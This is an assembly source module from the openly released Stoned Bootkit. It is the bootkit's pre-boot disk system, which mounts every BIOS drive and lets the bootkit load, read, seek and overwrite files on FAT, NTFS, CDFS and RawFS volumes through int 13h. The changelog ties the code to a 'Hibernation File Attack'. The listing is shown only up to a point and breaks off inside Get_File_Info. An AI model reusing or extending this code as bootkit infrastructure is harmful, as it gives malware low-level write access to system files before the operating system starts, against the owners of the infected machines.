; ******************************************************

;       Name: Disk System
;       Author: Peter Kleissner
;       Version: 0.1
;       Date: 17.02.2008 17:11:31
;       last Update: 30.11.2008 13:14:58

;       Stoned Bootkit
;       (C) 2005 - 2010 Peter Kleissner

; This source code is proprietary.
; License: http://web17.webbpro.de/index.php?page=terms-of-use

; ------------------------------------------------------

;       Access and Management of
;         - FAT file system
;         - NTFS file system
;         - CDFS file system
;         - Hard drives
;         - Partitions
;         - Floppies
;         - CD/DVD/BD

; ------------------------------------------------------

;       Exported Functions:
;         - Mount_Drives
;         - Load_System_File
;         - Open_File_Callback
;         - Read_File
;         - Seek_File
;         - Overwrite_File
;         - Get_BIOS_Drive_Type
;         - Get_File_Size

; defines: _EXPIRATION _DEBUG _SHARED_SOURCE_VERSION

; Open Source beause "Human knowledge belongs to the world"

; ******************************************************

[bits 16]                                       ; create a 16 Bit Code
CPU 386                                         ; Assemble instructions up to the 386 instruction set

%include "Module Functions.asm"
%include "Kernel Storage.asm"
%include "Errors.asm"

org Disk_System



;         Load File   Open File   Read File   Write File  Seek File   Get File Size   Proprietary
; FAT     Yes         Yes         Yes         Yes         Yes         Yes             Closed source
; NTFS    Yes         Yes         Yes         Yes         Yes         Yes             Closed source
; CDFS    Yes         Yes         Yes         No          Yes         Yes             Closed source
; RawFS   Yes         Yes         Yes         Yes         Yes         Yes             Shared source


; ChangeLog:
;    10.07.2007 09:36    removed Open File / Read File functions, integreated into Load System File
;                        removed Handle stack-variable; Boot System Handle is now always accessed
;                        masked out unused stack variables
;    10.07.2007 10:43    Initial Import from MBR-Version
;                        Function Import Mount_Boot_Partition_FAT
;               11:36    Initial Import of NTFS Support from Drive Manager
;               19:23    Added crossover call to NTFS module
;    22.02.2008 00:40    Implementation for Forensic Lockdown Software OS
;    25.11.2008 21:51    Implementation for the Hibernation File Attack
;    26.11.2008 21:08    Out-sourcing disk device driver
;    30.11.2008 14:44    Added Handles back again
;    08.12.2008 11:34    Added Seek File function
;    27.08.2009 19:04    Remade Mount Drives function, general clean-up
;    03.01.2010 11:00    Including a RawFS driver (CDFS was formerly included)




; export functions and symbols

jmp word Mount_Drives
jmp word Load_System_File
jmp word Open_File_Callback
jmp word Read_File
jmp word Seek_File
jmp word Overwrite_File
jmp word Get_BIOS_Drive_Type
jmp word Get_File_Size
jmp word Get_File_Info

dd Last_Device_Context
dd Last_Handle_Context






; define stack variables for both FAT driver and NTFS driver


%define System_Var                      bp

;%define Drive                           System_Var-4
;%define Drive_Pointer                   System_Var-8
%define Drive_Context_Pointer           System_Var-8
;%define Partitions                      System_Var-12
%define Partition_Table                 System_Var-16
;define Handle                          System_Var-20
%define Position                        System_Var-24
%define Temp                            System_Var-28
%define Temp2                           System_Var-32

%define Add_Position                    System_Var-36           ; [NTFS-only]
%define File_Record_48high              System_Var-40           ; [NTFS-only]
%define File_Record                     System_Var-44           ; operating File Record [NTFS-only]
;define Current_File_Record             System_Var-48           ; [NTFS-only]
;define Name_Type                       System_Var-49           ; [NTFS-only, Win32/DOS terminology]


; drive variables [only for standalone version]
;define Sector_Count                    System_Var-53
;define Sector_Number_48high            System_Var-57
;define Sector_Number                   System_Var-61
;define Floppy_drive                    System_Var-65


; special ^4 ("CASB") variables
%define Able_sectors                    System_Var-69           ; sectors per able sector
%define Able_sectors_counter            System_Var-73           ; able sectors per cluster remaining
%define Able_sectors_counter_static     System_Var-77           ; able sectors per cluster
%define Current_Sector                  System_Var-81           ; current sector (of cluster)
%define Current_Cluster                 System_Var-85           ; current cluster

; NTFS file system variables
;define Current_Record                  System_Var-89           ; current Record Number
%define Cluster_Count                   System_Var-93           ; Count of Cluster to read remaining
%define Current_LCN                     System_Var-97           ; Current LCN
%define Index_Entry_Flags               System_Var-98           ; Index Flags
%define Attribute_Base                  System_Var-100          ; Base of Attribute

; FAT file system variables
%define Name_Buffer_Position            System_Var-97           ; [CDFS-also]
%define FAT_order                       System_Var-98
%define FAT_checksum                    System_Var-99
%define FAT_entry_count                 System_Var-100
%define Last_entry                      System_Var-104          ; [NTFS-also]
%define Bytes_copy                      System_Var-108          ; [NTFS-also]
%define cluster_type                    System_Var-112          ; [NTFS-also, File/Directory determination]

; CDFS file system variables
%define Path_Table_Sector               System_Var-89           ; current sector of path table
%define Path_Table_Size                 System_Var-93           ; size (in bytes) of path table remaining
%define Directory_Record_Size           System_Var-93           ; size (in bytes) of directory record
%define Current_Index                   System_Var-101          ; current index in the path table
%define Top_Index                       System_Var-105          ; top (upper directory) index that is searched for

; RawFS variables
%define NextFileTable                   System_Var-89           ; sector of next File Table

; partition values
%define Partition_4_values              System_Var-128
%define Partition_3_values              System_Var-144
%define Partition_2_values              System_Var-160
%define Partition_1_values              System_Var-176


; currently working contextes
%define Drive_Context                   System_Var-207
%define Handle_Context                  System_Var-256


; size of all stack variables (used for stack frame creation)
%define Stack_Frame_Size                256


; Storage Device Driver definitions
%define Drive_Context_Size              1Fh
%define Handle_Context_Size             17+32                   ; size = Handle + System File Information [FAT only]

; RawFS MD5 IDs
%define MD5_Bootkit                     0
%define MD5_MBR_Backup                  1
%define MD5_FileTable                   2





; macros for reading sectors

%macro  Read 3

; %1 = sector
; %2 = sector count
; %3 = Error Label

; if CDFS_Sector_2 is defined it reads on the second sector in the sector buffer

; add the Partition Start Sector (to get absolute sector number)
mov eax,dword %1
add eax,[Drive_Context + 0]
mov [Disk_Address_Packet_LBA_Low],eax

push dword %2
pop dword [Disk_Address_Packet_Count]
%ifndef CDFS_Sector_2
mov [Disk_Address_Packet_Buffer],dword Sector_Buffer
%else
movzx eax,word [Drive_Context + 0Fh]
add eax,Sector_Buffer
mov [Disk_Address_Packet_Buffer],dword eax
%endif

; interrupt 13h, Function 42h: Extended Read
mov si,Disk_Address_Packet_Size
mov dl,[Drive_Context + 1Eh]
mov ah,42h
int 13h

jc %3

%endmacro



%macro  Read 4

; %1 = sector
; %2 = sector count
; %3 = Error Label
; %4 = Buffer

; (NTFS only)

; set data segment to zero to access disk address packet (for NTFS relocated module only)
push word 0
pop word ds

; add the Partition Start Sector (to get absolute sector number)
mov eax,dword %1
add eax,[Drive_Context + 0]
mov [Disk_Address_Packet_LBA_Low],eax

push dword %2
pop dword [Disk_Address_Packet_Count]
push dword %4
pop dword [Disk_Address_Packet_Buffer]

; interrupt 13h, Function 42h: Extended Read
mov si,Disk_Address_Packet_Size
mov dl,[Drive_Context + 1Eh]
mov ah,42h
int 13h

; set data buffer to read buffer (NTFS only, Extended Sector Buffer)
mov ax,Ext_Sector_Buffer / 16
mov ds,ax
jc %3

%endmacro



%macro  WriteSectors 4

; %1 = sector
; %2 = sector count
; %3 = Error Label
; %4 = Buffer

; (NTFS only)

; set data segment to zero to access disk address packet (for NTFS relocated module only)
push word 0
pop word ds

; add the Partition Start Sector (to get absolute sector number)
mov eax,dword %1
add eax,[Drive_Context + 0]
mov [Disk_Address_Packet_LBA_Low],eax

push dword %2
pop dword [Disk_Address_Packet_Count]
push dword %4
pop dword [Disk_Address_Packet_Buffer]

; interrupt 13h, Function 43h: Extended Write
mov si,Disk_Address_Packet_Size                                 ; offset of disk address packet
mov dl,[Drive_Context + 1Eh]                                    ; BIOS drive number
mov ah,43h
mov al,0                                                        ; nothing to verify
int 13h

; set data buffer to read buffer (NTFS only, Extended Sector Buffer)
mov ax,Ext_Sector_Buffer / 16
mov ds,ax
jc %3

%endmacro













Mount_Drives:

; call API_Mount_Drives

; mounts all drives (all types)

enter Stack_Frame_Size, 0                                                       ; create the stack frame for the variables
mpush eax, ds, esi, es, edi, ebx, ecx, edx                                      ; push the default of GPRs


; init Storage Device Driver variables
mov [Device_Context_Count],dword 0
mov [Handle_Context_Count],dword 0
mov [Last_Device_Context],word 0
mov [Last_Handle_Context],word 0

; emergency date expiry
%ifdef _EXPIRATION
%include "Emergency Expiry.asm"
%endif

; iterate through all BIOS drive numbers
;   00h...7Fh   Floppy Drives and ARMD (ATAPI Removable Media Device)
;   80h...9Fh   Hard Disks / USB / SCSI / other hard drives
;   A0h...FFh   general CD/DVD ROM not emulated drives



; first go through all possible floppy drives
;   00h...7Fh   Floppy Drives and ARMD (ATAPI Removable Media Device)
mov [Drive_Context + 1Eh],byte 00h                                              ; start with BIOS disk number 00h
mov ecx,128                                                                     ; first only 00h - 7Fh

Mount_Floppy_Devices_loop:                                                      ; mount all available floppy drives (BIOS disk numbers 00h - 7Fh)

push cx                                                                         ; store loop counter (register will be modified)

; use the Get Drive Parameters function to determine if
;   a) the drive is available and
;   b) the drive is a floppy drive
;
;  Input
;    AH = 08h
;    DL = BIOS device number
; 
;  Output
;    BL = Drive Type (Table 00242)
mov ah,08h                                                                      ; AH = 08h Get Drive Parameters
mov dl,[Drive_Context + 1Eh]                                                    ; DL = BIOS device number
push es                                                                         ; will be modified by Get Drive Parameters
int 13h
pop es
jc Mount_Floppy_Devices_loop_next                                               ; skip drive if not available

%ifndef _SHARED_SOURCE_VERSION
call Mount_Filesystem                                                           ; mount FAT and NTFS
%endif

Mount_Floppy_Devices_loop_next:                                                 ; next floppy drive
inc byte [Drive_Context + 1Eh]                                                  ; next BIOS disk number
pop cx                                                                          ; restore loop counter

loop Mount_Floppy_Devices_loop



; then all extended drives
;   80h...9Fh   Hard Disks / USB / SCSI / other hard drives
;   A0h...FFh   general CD/DVD ROM not emulated drives
mov [Drive_Context + 1Eh],byte 80h                                              ; start with BIOS disk number 80h (hard drives)
mov ecx,128                                                                     ; and go upon FFh

; allocate memory for the result buffer of Get Device Parameters function
sub sp,74                                                                       ; from the stack; 74 bytes
mov si,sp
mov [si + 0],word 74                                                            ; 00h	WORD	(call) size of buffer


Mount_Storage_Devices_loop:

push cx                                                                         ; store loop counter (register will be modified)
push si                                                                         ; and si (pointer to return buffer)

; Check Extensions Present
mov bx,55AAh
mov dl,[Drive_Context + 1Eh]                                                    ; DL = BIOS device number (BIOS-drive)
mov ah,41h
int 13h
jc Mount_Storage_Devices_loop_next                                              ; skip drive if not available

; use the Get Device Parameters function to determine if
;   a) the drive is available and
;   b) the drive is an ATAPI drive

;  Input
;    AH = 48h
;    DL = BIOS device number (BIOS-drive)
;    DS:SI = address of Result Buffer
; 
;  Output
;    DS:SI = Result Buffer stored, if no error occured

mov dl,[Drive_Context + 1Eh]                                                    ; DL = BIOS device number (BIOS-drive)
mov ah,48h                                                                      ; AH = 48h Get Device Parameters
int 13h
jc Mount_Storage_Devices_loop_try_default                                       ; skip drive if not available

; initialize the storage device context (values partition start sector, words per sector and total sectors)
mov [Drive_Context + 00h],dword 0                                               ; reset the partition start sector (very important for non partitioned drives)
mov bx,[si + 18h]                                                               ; 18h	WORD	bytes per sector
mov [Drive_Context + 04h],word bx                                               ; set bytes per sector
mov eax,[si + 10h]                                                              ; 10h	QWORD	total number of sectors on drive (low dword)
mov [Drive_Context + 06h],dword eax                                             ; Total Sectors (only for hard disks, -1 for removable-media)

; determine if the drive is a disk or removable-media drive
cmp [si + 40],dword "ATA "
je Mount_Storage_Device_Hard_Disk
cmp [si + 40],dword "ATAP"
je Mount_Storage_Device_removable_media
test [si + 02h],dword 00000100b                                                 ; check Bit 2 of Word on Offset 2 (Bit 2: "Media shall be removable.")
jnz Mount_Storage_Device_removable_media
cmp bx,2048
je Mount_Storage_Device_removable_media


Mount_Storage_Device_Hard_Disk:                                                 ; volume is a hard disk

%ifndef _SHARED_SOURCE_VERSION
call Mount_Drive_Partitions                                                     ; mount all partitions (automatically checks for FAT and NTFS partitions)
%endif
call Mount_Volume_RawFS                                                         ; mount additional a RawFS volume

jmp Mount_Storage_Devices_loop_next


Mount_Storage_Device_removable_media:                                           ; volume is a removable media (CD, DVD, BD)

%ifndef _SHARED_SOURCE_VERSION
call Mount_Filesystem_CDFS
%endif

jmp Mount_Storage_Devices_loop_next


Mount_Storage_Devices_loop_try_default:                                         ; if command Get Device Parameters goes wrong (happens for CD/DVD/BD drives on some BIOSes)

; load defaults
mov [Drive_Context + 00h],dword 0                                               ; partition start sector
mov [Drive_Context + 04h],word 2048                                             ; bytes per sector

jmp Mount_Storage_Device_removable_media


Mount_Storage_Devices_loop_next:

inc byte [Drive_Context + 1Eh]                                                  ; next BIOS disk number
pop si                                                                          ; restore the pointer to the allocated return buffer
pop cx                                                                          ; restore loop counter

loop Mount_Storage_Devices_loop


add sp,74                                                                       ; remove the allocated result buffer



%ifdef _DEBUG

; if no drives were found, output a warning (debug version only)
cmp [Device_Context_Count],dword 0
jne Handled_Boot_Partitions

; output the warning
mov eax,Warning_No_Drives_Mounted
call API_Debug_Message

Handled_Boot_Partitions:

%endif


mpop eax, ds, esi, es, edi, ebx, ecx, edx                                       ; pop the default of GPRs
leave                                                                           ; destroy the stack frame of the variables

clc                                                                             ; no error (returns always successful)
xor eax,eax

ret












Load_System_File:

; API Load_System_File, File, Buffer
; 
;   NTFS    Load_System_File_NTFS
;   FAT     Open_File_FAT, Read_File_FAT

; tries to load the file from any volume
; buffer is linear address


; create the stack frame for the variables
enter Stack_Frame_Size, 0

; push the default of GPRs
mpush ds, esi, es, edi, ebx, ecx, edx


; check the first three letters of the filename ('C:\...')

mov si,[Param1]
inc si

lodsb
cmp al,":"
jne Load_System_File_Invalid_Name

lodsb
cmp al,"\"
je Load_System_File_1
cmp al,"/"
jne Load_System_File_Invalid_Name

Load_System_File_1:
add [Param1],word 3


; try last Boot drive - if available, for faster access
cmp [Last_Device_Context],word 0
je Load_System_File_Enumerate

; load the file from the last working boot drive drive buffer
mov si,[Last_Device_Context]
mov [Drive_Context_Pointer],si
lea di,[Drive_Context]
mov cx,Drive_Context_Size
rep movsb

call Load_File
jnc Load_System_File_Exit



Load_System_File_Enumerate:

; try to find the file with all enumerated Boot Partitions
mov dx,[Device_Context_Count]
mov bx,Storage_Device_Driver_Stack

or dx,dx
jz Load_System_File_Invalid_Name


Load_System_File_drive_loop:

; copy the next Drive Context
mov si,bx
mov [Last_Device_Context],si
mov [Drive_Context_Pointer],si
lea di,[Drive_Context]
mov cx,Drive_Context_Size
rep movsb

; load the file from the drive (load file routine: CF = 0 successful)
mpush bx, dx
call Load_File
mpop bx, dx
jnc Load_System_File_Exit

; next Boot Partition if available
add bx,Drive_Context_Size
dec dx
jnz Load_System_File_drive_loop



Load_System_File_Invalid_Name:

; all partitions checked, but file wasn't found
mov [Last_Device_Context],word 0

mov eax,Invalid_Name
stc


Load_System_File_Exit:

; pop the default of GPRs
mpop ds, esi, es, edi, ebx, ecx, edx

; destroy the stack frame of the variables
leave

ret 2*4






; loads the file from current drive context

Load_File:

; store params (they will be modified)
mpush dword [Param1], dword [Param2]

; load the file from NTFS file system?
cmp [Drive_Context + 0Ah],byte 'N'
je Load_File_NTFS

; open/read the file from FAT file system?
cmp [Drive_Context + 0Ah],byte 12
je Load_File_FAT
cmp [Drive_Context + 0Ah],byte 16
je Load_File_FAT
cmp [Drive_Context + 0Ah],byte 32
je Load_File_FAT

; future: if removable-media, try mounting on-the-fly first!

; load the file from CDFS file system?
cmp [Drive_Context + 0Ah],byte 'C'
je Load_File_from_CDFS

; load the file from RawFS?
cmp [Drive_Context + 0Ah],byte 'R'
je Load_File_from_RawFS

; else unkown file system
mov eax,Invalid_Filesystem
stc

Load_File_Exit:

; restore params
mpop dword [Param1], dword [Param2]

ret



Load_File_FAT:

; Open the File
call Open_File_FAT
jc Load_File_Exit

; at this point we could create a handle

; if there are no bytes to read exit
cmp [Handle_Context + 17+28],dword 0
jz Load_File_FAT_Exit

; Read the File
push dword [Param3]                                             ; create a virtual param3 that holds the count of bytes to read
push dword [Handle_Context + 17+28]
pop dword [Param3]
call Read_File_FAT
pop dword [Param3]
jnc Load_File_FAT_Exit

; End of File?
cmp eax,File_EOF
je Load_File_FAT_Exit
cmp eax,File_EOF_end
je Load_File_FAT_Exit

; (error occured)
stc
jmp Load_File_Exit


Load_File_FAT_Exit:

; (no error)
clc
jmp Load_File_Exit



Load_File_NTFS:

mov [Handle_Context + 17],dword 'load'
mov [Handle_Context + 17+12],dword 'load'
call Load_System_File_NTFS

jmp Load_File_Exit



Load_File_from_CDFS:

mov [Handle_Context + 16],dword 'load'
call Load_File_CDFS

jmp Load_File_Exit


Load_File_from_RawFS:

call Load_File_RawFS

jmp Load_File_Exit












Open_File_Callback:

; API Open_File_Callback, File, Callback

;   FAT     Open_File_FAT
;   NTFS    Load_System_File_NTFS (in open-file mode)

; Errors (CF = 1)
;       Invalid file name, file not found......Invalid_Name
;       No free file handle....................No_free_Handle

; callback with every new handle called (with handle in eax)

enter Stack_Frame_Size, 0
mpush ds, esi, es, edi, ebx, ecx, edx


; validate file name (must have the "?:\directory\foo.bar" format)
mov si,[Param1]
inc si

lodsb
cmp al,':'
jne Open_File_Invalid_Filename

lodsb
cmp al,'\'
je Open_File_1
cmp al,'/'
jne Open_File_Invalid_Filename

Open_File_1:
add [Param1],word 3


; enumerate all storage devices and check if to open
mov bx,Storage_Device_Driver_Stack                              ; bx = pointer to currect drive context
mov dx,[Device_Context_Count]                                   ; dx = loop counter
or dx,dx
jz Open_File_Exit_normal

Open_File_Enumeration_loop:

; copy the next Drive Context
mov si,bx
mov [Drive_Context_Pointer],si
lea di,[Drive_Context]
mov cx,Drive_Context_Size
rep movsb

; try to open the file from the current drive
mpush bx, dx
call Open_File_from_Filesystem
mpop bx, dx
jc Open_File_Enumeration_loop_next

; create a handle
call Create_Handle_Context
or eax,eax
jz Open_File_NoFreeHandle

; and call the callback
;   eax = handle
push ds
push es
pushad
call [Param2]
popad
pop es
pop ds

Open_File_Enumeration_loop_next:

; next drive if available
add bx,Drive_Context_Size
dec dx
jnz Open_File_Enumeration_loop


Open_File_Exit_normal:
xor eax,eax
clc

Open_File_Exit:

mpop ds, esi, es, edi, ebx, ecx, edx
leave

ret 2*4



Open_File_Invalid_Filename:

mov eax,Invalid_Name
stc

jmp Open_File_Exit



Open_File_NoFreeHandle:

mov eax,No_free_Handle
stc

jmp Open_File_Exit



Open_File_from_Filesystem:

; trys to open the file from the current drive context

push dword [Param1]

; NTFS file system?
cmp [Drive_Context + 0Ah],byte 'N'
jne Open_File_notNTFS

mov [Handle_Context + 17],dword 'open'
call Load_System_File_NTFS
jmp Open_File_from_Filesystem_Exit
;jnc Open_File_from_Filesystem_Exit

Open_File_notNTFS:

; open/read the file from FAT file system?
cmp [Drive_Context+0Ah],byte 12
je Open_File_from_FAT
cmp [Drive_Context+0Ah],byte 16
je Open_File_from_FAT
cmp [Drive_Context+0Ah],byte 32
jne Open_File_notFAT

Open_File_from_FAT:
call Open_File_FAT
jmp Open_File_from_Filesystem_Exit

Open_File_notFAT:

; open the file from a RawFS volume?
cmp [Drive_Context + 0Ah],byte 'R'
jne Open_File_notRawFS

call Open_File_RawFS
jmp Open_File_from_Filesystem_Exit

Open_File_notRawFS:

; open the file from CDFS file system?
cmp [Drive_Context + 0Ah],byte 'C'
jne Open_File_from_Unknown_Filesystem

mov [Handle_Context + 16],dword 'open'
call Load_File_CDFS

Open_File_from_Filesystem_Exit:
pop dword [Param1]

ret


Open_File_from_Unknown_Filesystem:

; else unkown file system
mov eax,Invalid_Filesystem
stc

jmp Open_File_from_Filesystem_Exit













Read_File:

; API Read_File, Handle, Buffer, Size

enter Stack_Frame_Size, 0
mpush ds, esi, es, edi, ebx, ecx, edx

; load the handle
mov si,[Param1]
lea di,[Handle_Context]
mov cx,Handle_Context_Size
rep movsb

; load the device context
mov si,[Handle_Context]
lea di,[Drive_Context]
mov cx,Drive_Context_Size
rep movsb

; read file from NTFS?
cmp [Drive_Context + 0Ah],byte 'N'
je Read_File_from_NTFS

; read file from FAT?
cmp [Drive_Context+0Ah],byte 12
je Read_File_from_FAT
cmp [Drive_Context+0Ah],byte 16
je Read_File_from_FAT
cmp [Drive_Context+0Ah],byte 32
je Read_File_from_FAT

; read file from RawFS?
cmp [Drive_Context + 0Ah],byte 'R'
je Read_File_from_RawFS

; read file from CDFS?
cmp [Drive_Context + 0Ah],byte 'C'
je Read_File_from_CDFS

; else invalid file system
mov eax,Invalid_Filesystem
stc

Read_File_Exit:

mpop ds, esi, es, edi, ebx, ecx, edx
leave

ret



Read_File_from_FAT:

; File Size = 0?
cmp [Handle_Context + 17+28],dword 0
clc
jz Read_File_Exit

; read the file
mov [Handle_Context + 17+12],dword 'read'
call Read_File_FAT
jc Read_File_Exit

; update the handle if no error occured
lea si,[Handle_Context]
mov di,[Param1]
mov cx,Handle_Context_Size
rep movsb

clc
jmp Read_File_Exit



Read_File_from_NTFS:

; read the file (read-mode)
mov [Handle_Context + 17+12],dword 'read'
call Read_File_NTFS
jc Read_File_Exit

; update the handle if no error occured
lea si,[Handle_Context]
mov di,[Param1]
mov cx,Handle_Context_Size
rep movsb

clc
jmp Read_File_Exit



Read_File_from_RawFS:

; only sector based I/O
movzx eax,word [Drive_Context + 4]                                              ; bytes per sector
dec eax                                                                         ; get the bitmask
and eax,[Param3]                                                                ; and it with size
jz Read_File_Exit                                                               ; if not multiple of 512 exit without error (and -> CF = 0)

; within limits?
mov eax,[Handle_Context + 12]                                                   ; Current Byte Position
add eax,[Param3]                                                                ;  + size to read
cmp eax,[Handle_Context + 8]
ja Read_File_Exit                                                               ; if above exit without error (ja -> CF = 0)

; read the file
call Read_File_RawFS
jc Read_File_Exit

; update the handle if no error occured
lea si,[Handle_Context]
mov di,[Param1]
mov cx,Handle_Context_Size
rep movsb

clc
jmp Read_File_Exit



Read_File_from_CDFS:

; only sector based I/O
movzx eax,word [Drive_Context + 4]                                              ; bytes per sector
dec eax                                                                         ; get the bitmask
and eax,[Param3]                                                                ; and it with size
jz Read_File_Exit                                                               ; if not multiple of 512 exit without error (and -> CF = 0)

; within limits?
mov eax,[Handle_Context + 12]                                                   ; Current Byte Position
add eax,[Param3]                                                                ;  + size to read
cmp eax,[Handle_Context + 8]
ja Read_File_Exit                                                               ; if above exit without error (ja -> CF = 0)

; read the file
call Read_File_CDFS
jc Read_File_Exit

; update the handle if no error occured
lea si,[Handle_Context]
mov di,[Param1]
mov cx,Handle_Context_Size
rep movsb

clc
jmp Read_File_Exit













Seek_File:

; API Seek_File, Handle, Type, Position

; Handle = Handle of the file to seek; returned by Open_File
; Type = add Position to the relative Type: start position (zero), current position (nonzero)
; Position = bytes to seek in the file

; enter stack frame
enter Stack_Frame_Size, 0
mpush ds, esi, es, edi, ebx, ecx, edx

; load the handle
mov si,[Param1]
lea di,[Handle_Context]
mov cx,Handle_Context_Size
rep movsb

; load the device context
mov si,[Handle_Context]
lea di,[Drive_Context]
mov cx,Drive_Context_Size
rep movsb

; seek file from NTFS?
cmp [Drive_Context + 0Ah],byte 'N'
je Seek_File_NTFS

; seek file from FAT?
cmp [Drive_Context+0Ah],byte 12
je Seek_File_from_FAT
cmp [Drive_Context+0Ah],byte 16
je Seek_File_from_FAT
cmp [Drive_Context+0Ah],byte 32
jne Seek_File_from_FAT

; seek file from RawFS?
cmp [Drive_Context + 0Ah],byte 'R'
je Seek_File_from_RawFS

; seek file from CDFS? (same as on RawFS)
cmp [Drive_Context + 0Ah],byte 'C'
je Seek_File_from_RawFS

; else invalid file system
mov eax,Invalid_Filesystem
stc

Seek_File_Exit:

mpop ds, esi, es, edi, ebx, ecx, edx
leave

ret



Seek_File_from_FAT:

call Seek_File_FAT
jc Read_File_Exit

; update the handle if no error occured
lea si,[Handle_Context]
mov di,[Param1]
mov cx,Handle_Context_Size
rep movsb

clc
jmp Seek_File_Exit



Seek_File_NTFS:

; just update the handle
mov si,[Param1]
mov eax,[Param3]

; from beginning or current position?
cmp [Param2],dword 0
jne Seek_File_NTFS_Position_Add

mov [si + 12],dword 0

Seek_File_NTFS_Position_Add:
add [si + 12],eax
clc
jmp Seek_File_Exit



Seek_File_from_RawFS:

; just update the handle
mov si,[Param1]
mov eax,[Param3]

; within limits?
mov ebx,[si + 12]                                                               ; Current Byte Position
add ebx,eax                                                                     ;  + size to read
cmp ebx,[si + 8]
ja Seek_File_Exit                                                               ; if above exit without error (ja -> CF = 0)

; from beginning or current position?
cmp [Param2],dword 0
jne Seek_File_RawFS_Position_Add

mov [si + 12],dword 0

Seek_File_RawFS_Position_Add:
add [si + 12],eax
clc
jmp Seek_File_Exit













Overwrite_File:

; API Write_File, Handle, Buffer, Size

; very much like Read_File

enter Stack_Frame_Size, 0
mpush ds, esi, es, edi, ebx, ecx, edx

; load the handle
mov si,[Param1]
lea di,[Handle_Context]
mov cx,Handle_Context_Size
rep movsb

; load the device context
mov si,[Handle_Context]
lea di,[Drive_Context]
mov cx,Drive_Context_Size
rep movsb

; write file to NTFS?
cmp [Drive_Context + 0Ah],byte 'N'
je Write_File_to_NTFS

; write file to FAT?
cmp [Drive_Context+0Ah],byte 12
je Write_File_to_FAT
cmp [Drive_Context+0Ah],byte 16
je Write_File_to_FAT
cmp [Drive_Context+0Ah],byte 32
je Write_File_to_FAT

; write file to RawFS?
cmp [Drive_Context + 0Ah],byte 'R'
je Write_File_to_RawFS

; else invalid file system
mov eax,Invalid_Filesystem
stc

jmp Read_File_Exit



Write_File_to_FAT:

; File Size = 0?
cmp [Handle_Context + 17+28],dword 0
clc
jz Read_File_Exit

; write the file
mov [Handle_Context + 17+12],dword 'writ'                       ; write mode
call Read_File_FAT
jc Read_File_Exit

mov [Handle_Context + 17+12],dword 'norm'                       ; default mode

; update the handle if no error occured
lea si,[Handle_Context]
mov di,[Param1]
mov cx,Handle_Context_Size
rep movsb

clc
jmp Read_File_Exit



Write_File_to_NTFS:

; write the file (write-mode)
mov [Handle_Context + 17+12],dword 'writ'
call Read_File_NTFS
jc Read_File_Exit

mov [Handle_Context + 17+12],dword 'norm'                       ; default mode

; update the handle if no error occured
lea si,[Handle_Context]
mov di,[Param1]
mov cx,Handle_Context_Size
rep movsb

clc
jmp Read_File_Exit



Write_File_to_RawFS:

; only sector based I/O
movzx eax,word [Drive_Context + 4]                                              ; bytes per sector
dec eax                                                                         ; get the bitmask
and eax,[Param3]                                                                ; and it with size
jz Read_File_Exit                                                               ; if not multiple of 512 exit without error (and -> CF = 0)

; within limits?
mov eax,[Handle_Context + 12]                                                   ; Current Byte Position
add eax,[Param3]                                                                ;  + size to read
cmp eax,[Handle_Context + 8]
ja Read_File_Exit                                                               ; if above exit without error (ja -> CF = 0)

; read the file
call Write_File_RawFS
jc Read_File_Exit

; update the handle if no error occured
lea si,[Handle_Context]
mov di,[Param1]
mov cx,Handle_Context_Size
rep movsb

clc
jmp Read_File_Exit












Get_BIOS_Drive_Type:

; Get_BIOS_Drive_Type, BIOS Device Numnber

;   [Param1]  BIOS Device Numnber

; return:
;   00h       Not available
;   01h       Floppy
;   02h       Hard Disk
;   03h       CD/DVD/BD

enter Stack_Frame_Size, 0
mpush ds, esi, es, edi, ebx, ecx, edx

; allocate memory for the result buffer of Get Device Parameters function
sub sp,74                                                                       ; from the stack; 74 bytes
mov si,sp
mov [si + 0],word 74                                                            ; 00h WORD  (call) size of buffer

; call Get Device Parameters (with buffer ds:si)
mov dl,[Param1]                                                                 ; DL = BIOS device number (BIOS-drive)
mov ah,48h                                                                      ; AH = 48h Get Device Parameters
int 13h
jc Get_BIOS_Drive_Type_Not_Available                                            ; not available?

; Floppy?
test dl,80h
jz Get_BIOS_Drive_Type_Floppy

; removable media?
cmp [si + 40],dword "ATA "
je Get_BIOS_Drive_Type_hard_disk
cmp [si + 40],dword "ATAP"
je Get_BIOS_Drive_Type_removable
test [si + 02h],dword 00000100b                                                 ; check Bit 2 of Word on Offset 2 (Bit 2: "Media shall be removable.")
jnz Get_BIOS_Drive_Type_removable


Get_BIOS_Drive_Type_hard_disk:
mov eax,02h
jmp Get_BIOS_Drive_Type_Exit


Get_BIOS_Drive_Type_removable:
mov eax,03h
jmp Get_BIOS_Drive_Type_Exit


Get_BIOS_Drive_Type_Floppy:
mov eax,01h
jmp Get_BIOS_Drive_Type_Exit


Get_BIOS_Drive_Type_Not_Available:
xor eax,eax


Get_BIOS_Drive_Type_Exit:
add sp,74                                                                       ; remove the allocated buffer

mpop ds, esi, es, edi, ebx, ecx, edx
leave

ret 4












Get_File_Size:

; Get_File_Size, File Handle

;   [Param1]  File Handle
;   return:   File size in bytes

enter Stack_Frame_Size, 0
mpush ds, esi, es, edi, ebx, ecx, edx

mov esi,[Param1]                                                                ; eax -> Handle_Context
mov ebx,[esi + 0]                                                               ; ebx -> Device Context

cmp [bx + 0Ah],byte 'N'                                                         ; NTFS?
je Get_File_Size_NTFS

cmp [bx + 0Ah],byte 12                                                          ; FAT?
je Get_File_Size_FAT
cmp [bx + 0Ah],byte 16
je Get_File_Size_FAT
cmp [bx + 0Ah],byte 32
je Get_File_Size_FAT

cmp [bx + 0Ah],byte 'R'                                                         ; RawFS?
je Get_File_Size_RawFS
cmp [bx + 0Ah],byte 'C'                                                         ; CDFS?
je Get_File_Size_RawFS

xor eax,eax

Get_File_Size_Exit:
mpop ds, esi, es, edi, ebx, ecx, edx
leave

ret 4

Get_File_Size_NTFS:
mov eax,[si + 29]
jmp Get_File_Size_Exit

Get_File_Size_FAT:
mov eax,[si + 17 +18]
jmp Get_File_Size_Exit

Get_File_Size_RawFS:
mov eax,[si + 8]
jmp Get_File_Size_Exit












Get_File_Info:

; Get_File_Info, File Handle

;   [Param1]  File Handle
;   return:   eax = File size in bytes
;             ebx = File base (sector number)
;             ecx = Device type, 1 = hard disk, 2 = CD/DVD/BD

enter Stack_Frame_Size, 0
mpush ds, esi, es, edi, edx

; load the device context
mov si,[Param1]                                                                 ; -> Handle Context -> Device Context
mov si,[si]
lea di,[Drive_Context]
mov cx,Drive_Context_Size
rep movsb

mov esi,[Param1]                                                                ; eax -> Handle_Context

cmp [Drive_Context+0Ah],byte 'N'                                                ; NTFS?
je Get_File_Size_NTFS

